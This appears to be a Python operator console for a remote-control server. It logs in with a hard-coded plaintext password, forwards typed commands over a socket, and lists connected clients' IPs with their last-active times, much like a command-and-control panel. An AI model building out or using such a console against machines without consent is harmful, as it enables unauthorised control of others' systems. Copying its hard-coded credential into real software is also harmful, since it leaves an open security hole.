import socket
import time
from datetime import datetime, timezone
import pandas as pd
import ast
import re
import colorama
from colorama import Fore, Back

from logic.ftp import ftp_send


class Client:
	def __init__(self, server_ip: str, port: int, password: str) -> None:
		self.server_ip = server_ip
		self.port = port
		self.SUPER_PASSWORD = password
		colorama.init()
		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.client.connect((self.server_ip, self.port))
		# self.admin_thread = threading.Thread(target=self.connection)
		# self.admin_thread.daemon = True
		# self.admin_thread.start()


	def send(self, text: str, encode="utf-8") -> None:
		# text = self.SUPER_PASSWORD+"|"+text
		if encode:
			self.client.send(text.encode(encode))
		else:
			self.client.send(text)

	
	def send_response(self, text: str, encode="utf-8") -> None:
		# text = self.SUPER_PASSWORD+"|"+text
		if encode:
			self.client.send(text.encode(encode))
		else:
			self.client.send(text)
		while True:
			try:
				req = self.client.recv(1024)
				return req.decode()
			except:
				continue
		

if __name__ == "__main__":
	# SERVER_HOST = "212.115.110.10"
	SERVER_HOST = "192.168.1.103"
	SERVER_PORT = 7546
	SUPER_PASSWORD = "jesus_134"
	# client = Client("26.35.239.192", SERVER_PORT, SUPER_PASSWORD)
	# client = Client("26.172.116.184", SERVER_PORT, SUPER_PASSWORD)
	client = Client(SERVER_HOST, SERVER_PORT, SUPER_PASSWORD)
	client.send(SUPER_PASSWORD)
	while True:
		data = input(f"[{SERVER_HOST}:{SERVER_PORT}]$ ")
		if data == "":
			client.send(" ")
		if data == "exit":
			# del client.admin_thread
			exit()

		response = client.send_response(data)
		if data == "all_clients":

			res = re.findall(r"'(.+?)': \[.+? '(.+?)'\]", response)
			all_clients_df = {
				f"{Fore.YELLOW}IP address{Fore.RESET}": [],
				
				f"{Fore.GREEN}Last active{Fore.BLUE}": []
			}
			for key, value in res:
				all_clients_df[f"{Fore.YELLOW}IP address{Fore.RESET}"].append(f"{Fore.YELLOW}{key}{Fore.RESET}")
				
				date1 = datetime.strptime(datetime.now(timezone.utc).strftime("%d.%m.%Y/%H.%M.%S"), f"%d.%m.%Y/%H.%M.%S")
				date2 = datetime.strptime(value, f"%d.%m.%Y/%H.%M.%S")
				last_value = date1 - date2
				all_clients_df[f"{Fore.GREEN}Last active{Fore.BLUE}"].append(f"{Fore.GREEN}{last_value}{Fore.BLUE}")
			
			df = pd.DataFrame(all_clients_df)
			print(f"{df}{Fore.RESET}")
		else:
			print(response)
